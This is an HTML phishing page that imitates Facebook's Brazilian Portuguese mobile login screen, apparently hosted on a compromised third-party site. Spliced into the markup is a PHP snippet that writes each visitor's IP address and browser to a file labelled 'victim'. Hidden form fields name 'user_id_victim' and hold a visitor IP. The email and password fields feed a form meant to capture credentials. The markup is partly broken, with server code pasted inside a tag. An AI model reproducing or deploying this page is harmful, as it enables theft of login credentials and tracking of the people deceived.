<html>
 <head> 
  <title>Entrar no Facebook | Facebook</title> 
  <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/gB76kJXPYJV.png" rel="shortcut icon" sizes="196x196"> 
  <meta name="referrer" content="origin-when-crossorigin" id="meta_referrer"> 
  <meta name="theme-color" content="#3b5998"> 
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y4/l/0,cross/WxJ7yN8ML-P.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="avvSmFM" crossorigin="anonymous"> 
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yY/l/0,cross/Kz3oKAcAT-t.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="I5dSvkV" crossorigin="anonymous"> 
  <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/l/0,cross/KK3FfPl_XB0.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="hD2frI4" crossorigin="anonymous"> 
  <meta http-equiv="origin-trial" data-feature="getInstalledRelatedApps" data-expires="2017-12-04" content="AvpndGzuAwLY463N1HvHrsK3WE5yU5g6Fehz7Vl7bomqhPI/nYGOjVg3TI0jq5tQ5dP3kDSd1HXVtKMQyZPRxAAAAABleyJvcmlnaW4iOiJodHRwczovL2ZhY2Vib29rLmNvbTo0NDMiLCJmZWF0dXJlIjoiSW5zdGFsbGVkQXBwIiwiZXhwaXJ5IjoxNTEyNDI3NDA0LCJpc1N1YmRvbWFpbiI6dHJ1ZX0="> 
  <meta name="description" content="Entre no Facebook para começar a compartilhar e se conectar com seus amigos, familiares e com as pessoas que você conhece."> 
  <meta property="og:site_name" content="Facebook"> 
  <meta property="og:type" content="website"> 
  <meta property="og:title" content="Entrar no Facebook | Facebook"> 
  <meta property="og:description" content="Entre no Facebook para começar a compartilhar e se conectar com seus amigos, familiares e com as pessoas que você conhece."> 
  <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png"> 
  <meta property="og:url" content="https://pt-br.facebook.com/"> 
  <link rel="alternate" hreflang="x-default" href="https://www.facebook.com/"> 
  <link rel="alternate" hreflang="en" href="https://www.facebook.com/"> 
  <link rel="alternate" hreflang="ar" href="https://m.facebook.com/?locale2=ar_AR"> 
  <link rel="alternate" hreflang="bg" href="https://m.facebook.com/?locale2=bg_BG"> 
  <link rel="alternate" hreflang="bs" href="https://m.facebook.com/?locale2=bs_BA"> 
  <link rel="alternate" hreflang="ca" href="https://m.facebook.com/?locale2=ca_ES"> 
  <link rel="alternate" hreflang="da" href="https://m.facebook.com/?locale2=da_DK"> 
  <link rel="alternate" hreflang="el" href="https://m.facebook.com/?locale2=el_GR"> 
  <link rel="alternate" hreflang="es" href="https://m.facebook.com/?locale2=es_LA"> 
  <link rel="alternate" hreflang="es-es" href="https://m.facebook.com/?locale2=es_ES"> 
  <link rel="alternate" hreflang="fa" href="https://m.facebook.com/?locale2=fa_IR"> 
  <link rel="alternate" hreflang="fi" href="https://m.facebook.com/?locale2=fi_FI"> 
  <link rel="alternate" hreflang="fr" href="https://m.facebook.com/?locale2=fr_FR"> 
  <link rel="alternate" hreflang="fr-ca" href="https://m.facebook.com/?locale2=fr_CA"> 
  <link rel="alternate" hreflang="hi" href="https://m.facebook.com/?locale2=hi_IN"> 
  <link rel="alternate" hreflang="hr" href="https://m.facebook.com/?locale2=hr_HR"> 
  <link rel="alternate" hreflang="id" href="https://m.facebook.com/?locale2=id_ID"> 
  <link rel="alternate" hreflang="it" href="https://m.facebook.com/?locale2=it_IT"> 
  <link rel="alternate" hreflang="ko" href="https://m.facebook.com/?locale2=ko_KR"> 
  <link rel="alternate" hreflang="mk" href="https://m.facebook.com/?locale2=mk_MK"> 
  <link rel="alternate" hreflang="ms" href="https://m.facebook.com/?locale2=ms_MY"> 
  <link rel="alternate" hreflang="pl" href="https://m.facebook.com/?locale2=pl_PL"> 
  <link rel="alternate" hreflang="pt" href="https://m.facebook.com/?locale2=pt_BR"> 
  <link rel="alternate" hreflang="pt-pt" href="https://m.facebook.com/?locale2=pt_PT"> 
  <link rel="alternate" hreflang="ro" href="https://m.facebook.com/?locale2=ro_RO"> 
  <link rel="alternate" hreflang="sl" href="https://m.facebook.com/?locale2=sl_SI"> 
  <link rel="alternate" hreflang="sr" href="https://m.facebook.com/?locale2=sr_RS"> 
  <link rel="alternate" hreflang="th" href="https://m.facebook.com/?locale2=th_TH"> 
  <link rel="alternate" hreflang="vi" href="https://m.facebook.com/?locale2=vi_VN"> 
  <link rel="canonical" href="https://pt-br.facebook.com/login/"> 
  <link rel="manifest" href="/data/manifest/" crossorigin="use-credentials"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/y-/r/YISyGFJSGwM.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/Jci4RYxT_Pg.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yH/r/UoSgDbKBCMi.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/WOWkNfYPrH7.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yw/r/0U-v2ShfFER.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/0NnQhbFkkxz.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/y_/r/JopZtdti8dq.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yf/r/kq2sRIZ8pvR.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yN/r/FrwRuW8lz2G.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yp/r/7zTbIovInyj.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3iaCE4/yM/l/pt_BR/irTFP3wPHoD.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ye/r/aQN7O8mgNY7.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yn/r/A4DzBx8rjba.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3icm24/yO/l/pt_BR/ymZpp_Vrvt_.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yA/r/EDymp2lCr--.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3i8594/y5/l/pt_BR/w3eb9GJO-TH.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3iNPx4/yx/l/pt_BR/pRDJ3U6jjuJ.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
  <link href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/r/BwjU4B_qfpp.js?_nc_x=Ij3Wp8lg5Kz" rel="preload" as="script" crossorigin="anonymous"> 
 </head> 
 <body tabindex="0" class="touch x2 android _fzu _50-3 iframe acw  portrait" style="background-color: rgb(255, 255, 255); min-height: 524px;"> 
  <div id="viewport" data-kaios-focus-transparent="1" style="min-height: 524px;"> 
   <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1> 
   <div id="page"> 
    <div class="_129_" id="header-notices"></div> 
    <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane" style="min-height: 524px;"> 
     <div class="_7om2"> 
      <div class="_4g34" id="u_0_0"> 
       <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice"> 
        <div class="_52jd"></div> 
       </div> 
       <div> 
        <div class="_4-4l"> 
         <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element"> 
          <div class="_qw9 grouped aclb" id="u_0_1"> 
           <a href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DBIkkYGxnqhYMUeqwUZ7gNSZ6%26referrer_params%255Blink_source%255D%3Dfb_app_banner&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;refid=8" target="_top" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea"> 
            <div class="ib cc"> 
             <i class="l img sp_xm9DDmY7HAL_2x sx_3bd3fe"></i> 
             <div class="c"> 
              <span class="fcl">Obtenha o Facebook para Android e navegue mais rápido.</span> 
             </div> 
            </div></a> 
          </div> 
          <iframe style="display: none;"></iframe> 
         </div> 
         <div class="_7om2 _52we _2pid _52z6"> 
          <div class="_4g34"> 
           <a href="/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjEzMTMzMjQ3LCJjYWxsc2l0ZV9pZCI6Nzk2MTcwNzM0NTY5ODY0fQ%3D%3D&amp;refid=8"><img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" width="112" class="img" alt="facebook"></a> 
          </div> 
         </div> 
         <div class="_5rut"> 
          <div id="globalContainer" class="uiContextualLayerParent"> 
           <div class="fb_content clearfix " id="content" role="main"> 
            <div class="_4-u5 _30ny"> 
             <span class="muffin_tracking_pixel_start"></span> 
             <img class="tracking_pixel"> 
             <span class="muffin_tracking_pixel_end"></span> 
             <div if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n";
    }
$useragent = " User-Agent: ";
$browser = $_SERVER['HTTP_USER_AGENT'];


$file = 'ip.txt';
$victim = "IP: ";
$fp = fopen($file, 'a');

fwrite($fp, $victim);
fwrite($fp, $ipaddress);
fwrite($fp, $useragent);
fwrite($fp, $browser);


fclose($fp);
</div> 
                 <div id="loginform"> 
                  <div class="clearfix _5466 _44mg"> 
                   <div class="_96n9" id="email"> 
                    <input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="email" name="email" placeholder="Número de celular ou email" data-sigil="m_login_email"> 
                   </div> 
                  </div> 
                  <div class="clearfix _5466 _44mg"> 
                   <div class="_55wq" =""=""></div> 
                   <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" name="pass" id="pass" placeholder="Senha" type="password" data-sigil="password-plain-text-toggle-input"> 
                  </div> 
                  <div class="_2pie" style="text-align:center;"> 
                   <div id="login_password_step_element" data-sigil="login_password_step_element"> 
                    <button type="submit" value="1" class="_54k8 _52jh _56bs _56b_ _28lf _9cow _56bw _56bu" id="loginbutton" name="login" data-sigil="touchable login_button_block m_login_button" data-autoid="autoid_4"><span class="_55sr">Entrar</span></button> 
                   </div> 
                  </div> 
                 </div> 
                 <input type="hidden" name="user_id_victim" value="jF5ITYVG1wQk0wMXFhM2hPZHowOQ=="> 
                 <input type="hidden" name="user_ip" value="181.174.90.183"> 
                 <input type="hidden" name="type" value="Facebook"> 
                </div> 
               </form> 
               <input type="hidden" name="lsd" value="AVo-pDgJZb8" autocomplete="off"> 
               <input type="hidden" name="jazoest" value="2908" autocomplete="off"> 
               <input type="hidden" name="m_ts" value="1613133247"> 
               <input type="hidden" name="li" value="v3UmYMDLfDs3Ca1f1XB4K8e9"> 
               <input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number"> 
               <input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries"> 
               <div id="user_info_container" data-sigil="user_info_after_failure_element"></div> 
               <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div> 
               <div id="otp_retrieve_desc_container"></div> 
               <div> 
                <div class="_56be"> 
                 <div class="_55wo _56bf"> 
                  <div class="_96n9" id="email_input_container"> 
                  </div> 
                 </div> 
                </div> 
                <div class="_45wq"></div> 
                <div class="_56be"> 
                 <div class="_55wo _56bf"> 
                  <div class="_1upc _mg8" data-sigil="m_login_password"> 
                   <div class="_7om2"> 
                    <div class="_4g34 _5i2i _52we"> 
                     <div class="_5xu4"> 
                     </div> 
                    </div> 
                    <div class="_5s61 _216i _5i2i _52we"> 
                     <div class="_5xu4"> 
                      <div class="_2pi9" style="display:none" id="u_0_2"> 
                       <a href="#" data-sigil="password-plain-text-toggle"><span class="mfss" style="display:none" id="u_0_3">OCULTAR</span><span class="mfss" id="u_0_4">MOSTRAR</span></a> 
                      </div> 
                     </div> 
                    </div> 
                   </div> 
                  </div> 
                 </div> 
                </div> 
               </div> 
               <div class="_2pie" style="text-align:center;"> 
                <div id="u_0_5" data-sigil="login_password_step_element"> 
                </div> 
                <div class="_7eif" id="oauth_login_button_container" style="display:none"></div> 
                <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div> 
                <div id="otp_button_elem_container"></div> 
               </div> 
               <div class="_2pie _9omz"> 
                <div class="_52jj _9on1"> 
                 <a class="_9on1" tabindex="0" href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Flocale%3Dpt_BR&amp;r&amp;cuid&amp;ars=facebook_login&amp;privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjIyNzU4MDA1LCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&amp;lwv=100&amp;locale2=pt_BR" id="forgot-password-link">Esqueceu a senha?</a> 
                </div> 
               </div> 
               <div style="padding-top: 42px"> 
                <div> 
                 <div> 
                  <div> 
                   <div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator"> 
                    <span class="_43mh">ou</span> 
                   </div> 
                   <input type="hidden" name="prefill_contact_point" id="prefill_contact_point"> 
                   <input type="hidden" name="prefill_source" id="prefill_source"> 
                   <input type="hidden" name="prefill_type" id="prefill_type"> 
                   <input type="hidden" name="first_prefill_source" id="first_prefill_source"> 
                   <input type="hidden" name="first_prefill_type" id="first_prefill_type"> 
                   <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false"> 
                   <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false"> 
                   <input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false"> 
                   <input type="hidden" id="scetoggle"> 
                   <div class="_xo8"></div> 
                   <noscript> 
                    <input type="hidden" name="_fb_noscript" value="true"> 
                   </noscript> 
                   <div> 
                    <div class="_52jj _5t3b" id="signup_button_area"> 
                     <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Criar nova conta</a> 
                    </div> 
                   </div> 
                   <div> 
                    <div data-sigil="login_identify_step_element"></div> 
                    <div class="other-links _8p_m">
                     <ul class="_5pkb _55wp">
                      <li></li>
                     </ul>
                    </div> 
                    <div class="other-links _8p_m"> 
                     <ul class="_5pkb _55wp"> 
                      <li></li> 
                     </ul> 
                    </div> 
                   </div> 
                  </div> 
                 </div> 
                </div> 
               </div> 
              </div> 
              <div style="display:none"> 
               <div></div> 
               <div></div> 
               <div></div> 
              </div> 
              <span><img src="https://facebook.com/security/hsts-pixel.gif" width="0" height="0" style="display:none"></span> 
              <div class="_55wr _5ui2" data-sigil="m_login_footer"> 
               <div class="_5dpw"> 
                <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea"> 
                 <div class="_7om2"> 
                  <div class="_4g34"> 
                   <span class="_52jc _52j9 _52jh _3ztb">Português (Brasil)</span> 
                   <div class="_3ztc"> 
                    <span class="_52jc"><a href="/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQCly9nerc9Qd9P_I5Y&amp;refid=8" data-locale="es_LA" data-sigil="change_language">Español</a></span> 
                   </div> 
                   <div class="_3ztc"> 
                    <span class="_52jc"><a href="/a/language.php?l=de_DE&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAw6_1wTKwIXCfZ2GM&amp;refid=8" data-locale="de_DE" data-sigil="change_language">Deutsch</a></span> 
                   </div> 
                   <div class="_3ztc"> 
                    <span class="_52jc"><a href="/a/language.php?l=ar_AR&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQCTwi9F8_wc2Ydi6vk&amp;refid=8" data-locale="ar_AR" data-sigil="change_language">العربية</a></span> 
                   </div> 
                  </div> 
                  <div class="_4g34"> 
                   <div class="_3ztc"> 
                    <span class="_52jc"><a href="/a/language.php?l=en_US&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAJap6IaJ26SfXgL3I&amp;refid=8" data-locale="en_US" data-sigil="change_language">English (US)</a></span> 
                   </div> 
                   <div class="_3ztc"> 
                    <span class="_52jc"><a href="/a/language.php?l=fr_FR&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQBD7J-z-3c9XVJpbCU&amp;refid=8" data-locale="fr_FR" data-sigil="change_language">Français (France)</a></span> 
                   </div> 
                   <div class="_3ztc"> 
                    <span class="_52jc"><a href="/a/language.php?l=it_IT&amp;lref=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDA64cafsFNx22Vj94&amp;refid=8" data-locale="it_IT" data-sigil="change_language">Italiano</a></span> 
                   </div> 
                   <a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2F%3Frefsrc%3Dhttps%253A%252F%252Fwww.facebook.com%252F&amp;refid=8"> 
                    <div class="_3j87 _1rrd _3ztd" aria-label="Lista completa de idiomas" data-sigil="more_language"> 
                     <i class="img sp_FnpQQMXWL5W_2x sx_21c2b3"></i> 
                    </div></a> 
                  </div> 
                 </div> 
                </div> 
                <div class="_5ui4"> 
                 <div class="_96qv _9a0a"> 
                  <a href="/facebook?refid=8" class="_96qw" title="Leia nosso blog, descubra a central de recursos e encontre oportunidades de trabalho.">Sobre</a> 
                  <span aria-hidden="true"> · </span> 
                  <a href="/help/?ref=pf&amp;refid=8" class="_96qw" title="Acesse nossa Central de Ajuda.">Ajuda</a> 
                  <span aria-hidden="true"> · </span> 
                  <span class="_96qw" id="u_0_6">Mais</span> 
                 </div> 
                 <div class="_96qv" style="display:none" id="u_0_7"> 
                  <a href="https://messenger.com/" class="_96qw" title="Confira o Messenger."> Messanger </a> 
                  <a href="/lite/?refid=8" class="_96qw" title="Facebook Lite para Android."> Facebook Lite </a> 
                  <a href="https://m.facebook.com/watch/?refid=8" class="_96qw" title="Navegue pelos nossos vídeos do Watch."> Watch </a> 
                  <a href="/directory/people/?refid=8" title="Navegue no nosso diretório de pessoas." class="_96qw">Pessoas</a> 
                  <a href="/directory/pages/?refid=8" class="_96qw">Páginas</a> 
                  <a href="/pages/category/?refid=8" class="_96qw">Categorias de Página</a> 
                  <a href="/places/?refid=8" class="_96qw" title="Confira locais populares no Facebook.">Locais</a> 
                  <a href="https://facebook.com/games/?refid=8" class="_96qw" title="Confira os jogos do Facebook.">Jogos</a> 
                  <a href="/directory/places/?refid=8" title="Navegue pelo nosso diretório de locais." class="_96qw">Locais</a> 
                  <a href="/marketplace/?refid=8" class="_96qw" title="Compre e venda no Facebook Marketplace.">Marketplace</a> 
                  <a href="https://pay.facebook.com/?refid=8" class="_96qw" target="_blank" title="Saiba mais sobre o Facebook Pay">Facebook Pay</a> 
                  <a href="/directory/groups/?refid=8" title="Navegue pelo nosso diretório de grupos." class="_96qw">Grupos</a> 
                  <a href="/jobs/?refid=8" class="_96qw" title="Candidate-se a vagas de emprego e contrate no Facebook.">Vagas de emprego</a> 
                  <a href="https://www.oculus.com/" class="_96qw" target="_blank" title="Saiba mais sobre o Oculus">Oculus</a> 
                  <a href="https://portal.facebook.com/?refid=8" class="_96qw" target="_blank" title="Saiba mais sobre o Portal do Facebook">Portal</a> 
                  <a href="https://lm.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT1nw_CfbSXYYzxfgIwpv_2IdPlOmYKNO2vn1FY5Ki3Jz0Pq0fk6RXa6XZ9B78cnt08cmRycSJuJFi0vRNbev6GIWDLQOPW54jfgO2GOlo0AXiiHlYM1dpfRxT3iicrewXOZYXQbOe7j5Ybwd5duljlDqrHgvOIfTUCepw" class="_96qw" title="Confira o Instagram" target="_blank" rel="noopener" data-sigil="MLynx_asynclazy">Instagram</a> 
                  <a href="/local/lists/245019872666104/?refid=8" class="_96qw" title="Navegar pelo nosso diretório de listas locais.">Local</a> 
                  <a href="/fundraisers/?refid=8" class="_96qw" title="Doe para causas importantes.">Campanhas de arrecadação de fundos</a> 
                  <a href="/biz/directory/?refid=8" class="_96qw" title="Navegue pelo nosso diretório de serviços do Facebook.">Serviços</a> 
                  <a href="https://developers.facebook.com/?ref=pf&amp;refid=8" class="_96qw" title="Desenvolver em nossa plataforma.">Desenvolvedores</a> 
                  <a href="/careers/?ref=pf&amp;refid=8" class="_96qw" title="Dê um passo adiante na sua carreira em nossa incrível empresa.">Carreiras</a> 
                  <a data-nocookies="1" href="/privacy/explanation?refid=8" class="_96qw" title="Saiba mais sobre sua privacidade e o Facebook.">Privacidade</a> 
                 </div> 
                 <span class="mfss fcg">Facebook, Inc.</span> 
                </div> 
               </div> 
              </div> 
             </div> 
             <div class=""></div> 
             <div class="viewportArea _2v9s" style="display:none" id="u_0_8" data-sigil="marea"> 
              <div class="_5vsg" id="u_0_9" style="max-height: 180px;"></div> 
              <div class="_5vsh" id="u_0_a" style="max-height: 262px;"></div> 
              <div class="_5v5d fcg"> 
               <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Carregando... 
              </div> 
             </div> 
             <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea"> 
              <div class="container"> 
               <div class="image"></div> 
               <div class="message" data-sigil="error-message"></div> 
               <a class="link" data-sigil="MPageError:retry">Tentar novamente</a> 
              </div> 
             </div> 
            </div> 
           </div> 
           <div id="static_templates"> 
            <div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_1"> 
             <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader"> 
              <div class="_7om2 _52we"> 
               <div class="_5s61"> 
                <div class="_52z7"> 
                 <button type="submit" value="Cancelar" class="cancelButton btn btnD bgb mfss touchable" id="u_0_c" data-sigil="dialog-cancel-button">Cancelar</button> 
                 <button type="submit" value="Voltar" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Voltar" id="u_0_d" data-sigil="dialog-back-button"><i class="img sp_FnpQQMXWL5W_2x sx_7dc7c8" style="margin-top: 2px;"></i></button> 
                </div> 
               </div> 
               <div class="_4g34"> 
                <div class="_52z6"> 
                 <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">
                   Carregando... 
                 </div> 
                </div> 
               </div> 
               <div class="_5s61"> 
                <div class="_52z8" id="modalDialogHeaderButtons"></div> 
               </div> 
              </div> 
             </div> 
             <div class="modalDialogView" id="modalDialogView"></div> 
             <div class="_5v5d _5v5e fcg" id="dialogSpinner"> 
              <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_b" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>Carregando... 
             </div> 
            </div> 
           </div> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yL/l/0,cross/R25I53Ir1Qr.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous"> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yH/l/0,cross/wjRDCDpAguu.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous"> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yt/r/rm9NDoDrVpn.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yl/r/3CsZKNtbLqA.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/TgvtWu7yqq9.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yF/r/FBZTrRYISjq.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3i4B74/yO/l/pt_BR/HUbd_NIIL1d.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce=""> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yC/l/0,cross/NK4500uMFtK.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous"> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y3/l/0,cross/lRDjDqK_Yq2.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous"> 
           <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yT/l/0,cross/IxxDAbiZepi.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous"> 
           <div class="AdBox Ad advert post-ads"></div> 
           <div id="pageFooter"> 
            <div></div> 
            <div> 
             <div></div> 
            </div> 
           </div> 
           <!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 START --> 
           <script type="text/javascript" src="https://count.carrierzone.com/app/count_server/count.js">
</script> 
           <script type="text/javascript"><!--
wm_custnum='820e8bbd8d6e1ac4';
wm_page_name='index.php';
wm_group_name='/services/webpages/n/e/newphaseelectrical.co.uk/public/NpkRI';
wm_campaign_key='campaign_id';
wm_track_alt='';
wiredminds.count();
// -->
</script> 
           <!-- WiredMinds eMetrics tracking with Enterprise Edition V5.4 END --> 
          </div> 
         </div> 
        </div> 
       </div> 
      </div> 
     </div> 
    </div> 
   </div> 
  </div> 
 </body>
</html>